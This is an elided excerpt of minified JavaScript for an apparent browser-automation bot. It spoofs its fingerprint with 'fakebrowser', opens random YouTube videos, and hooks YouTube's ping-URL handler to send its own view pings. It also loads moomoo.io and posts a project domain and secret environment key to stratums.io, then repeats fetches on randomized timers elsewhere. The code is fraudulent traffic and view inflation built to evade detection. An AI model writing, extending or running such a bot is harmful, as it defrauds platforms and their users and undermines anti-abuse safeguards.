...
async function watchRandomFrontScreenVideo(e) {
  console.log("watching..."), await e.evaluate((() => {
    const e = Array.from(document.getElementsByClassName("yt-core-image--fill-parent-height yt-core-image--fill-parent-width yt-core-image yt-core-image--content-mode-scale-aspect-fill yt-core-image--loaded")).slice(0, 7);
    var t;
    (t = e, t[Math.floor(Math.random() * t.length)]).setAttribute("id", "__scope")
...
async function searchAndView(e) {
  ...
  let t = await e.evaluate((() => {
    ...
    const t = Array.from(document.getElementsByTagName("ytd-video-renderer")).map((e => e.childNodes[2].childNodes[1].childNodes[1])),
      o = (s = t)[Math.floor(Math.random() * s.length)];
    var s;
    const r = o.childNodes[5].childNodes[0].childNodes[2].ariaLabel;
    return o.setAttribute("id", "__hookedVidToClick"), o.scrollIntoView(),
      function(t) {
          ...
          constructor(...e) {
            ...
            e[0].toString().includes('getAttribute("data-ping-url') && (e[0] = e => {
              ...
              if (o) {
                ...
                s.open("POST", o + "&mo=3&ping_key=" + encodeURIComponent(e), !0), s.overrideMimeType("text/plain"), s.onload = () => {}, s.send(), t = !0
              }
            }), t || super(...e)
          }
        }, window.setTimeout((() => {
...
if ((async () => {
    ...
    const {
      FakeBrowser: e
    } = require("fakebrowser"), t = require("path").resolve(__dirname, "./fakeBrowserUserData"), o = (new e.Builder).displayUserActionLayer(!1).vanillaLaunchOptions(pptOptions).usePlugins([require("puppeteer-extra-plugin-adblocker")({
      blockTrackers: !0,
    ...
    e: for (;;) try {
      let e = await async function e() {
        ...
        try {
          t = (await axios.get(process.env.UkcTRXURL, {
            headers: o
          }))?.data
        } catch (e) {}
        if (t) try {
    ...
    doFlags.doYT && setTimeout((async () => {
      ...
      if (await s.goto("https://moomoo.io", {
        ...
        }).catch((e => o++)), o) return await s.close(), await t.close(), e();
      if (!(await s.evaluate("document.documentElement.innerHTML")).includes("isMoomooIo")) return await s.close(), await t.close(), e();
      let r;
      if (doFlags.doDual) {
        if (r = await t.newPage(), await r.goto("https://moomoo.io", {
            timeout: MM_NETWORK_PATIENCE
          }).catch((e => o++)), o) return await r.close(), await t.close(), e();
        const s = await r.evaluate("document.documentElement.innerHTML");
        if (log(s.slice(0, 50)), !s.includes("isMoomooIo")) return await r.close(), await t.close(), e()
      }

      function i() {
        axios.post("https://stratums.io/research", {
          dom: process.env.PROJECT_DOMAIN,
          key: process.env.UkcTRSYX
        }, {
          headers: {
...
doFlags.doOUJS && (async () => {
  ...
  async function s() {
    ...
    const l = await fetch(t, c).catch((e => {}));
    ...
    if (!await fetch(s, p).catch((e => {}))) return;
    const h = {
      headers: {
  ...
  s();
  for (let e = 0; e < 4; e++) setTimeout(s, 6e4 * e * getRandomInt(1, 3));
  setInterval((() => {
    s();
    for (let e = 0; e < 4; e++) setTimeout(s, 6e4 * e * getRandomInt(1, 3))
  }), 36e5)
